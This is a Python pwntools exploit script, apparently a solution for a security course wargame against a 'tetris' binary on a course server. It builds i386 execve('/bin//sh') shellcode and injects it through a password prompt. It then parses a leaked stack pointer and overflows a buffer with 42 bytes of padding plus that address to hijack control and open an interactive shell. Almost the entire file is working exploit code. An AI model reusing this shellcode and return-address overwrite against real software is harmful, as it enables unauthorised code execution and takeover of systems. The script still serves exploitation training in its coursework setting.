#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './tetris' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 10922 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
printflag_asm = """
xor ecx, ecx
mul ecx
xor ebx, ebx

mov al, 0xb
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
"""
# Want 0x53 bytes (83)
filler = b'a'
payload = asm(printflag_asm)
#print(payload.index(b"\x00"))
n_filler = 0x54 - len(payload) - 1
payload += filler * n_filler
#print(payload.index(b"\x00"))
print(payload)

p.recvuntil(b'Quit', drop=True)
p.recvline()
p.sendline(b'3')

p.recvuntil(b'password:', drop=True)
p.sendline(payload)

p.recvuntil(b'offset ', drop=True)
stack_pointer = p.recvline()
stack_pointer = str(stack_pointer[:10])
log.info(stack_pointer)
stack_pointer = stack_pointer[2:12]

log.info(stack_pointer)
stack_pointer = int(stack_pointer, 0)
log.info(f"Stack pointer: {stack_pointer}")
#Stack pointer acquired

p.recvuntil(b'> ', drop=True)
p.sendline(b'1')
#len_stack_pointer = len(stack_pointer)
#log.info(str(len_stack_pointer))

padding = 42
p.sendline(b'a'*padding + p32(stack_pointer))
p.interactive()

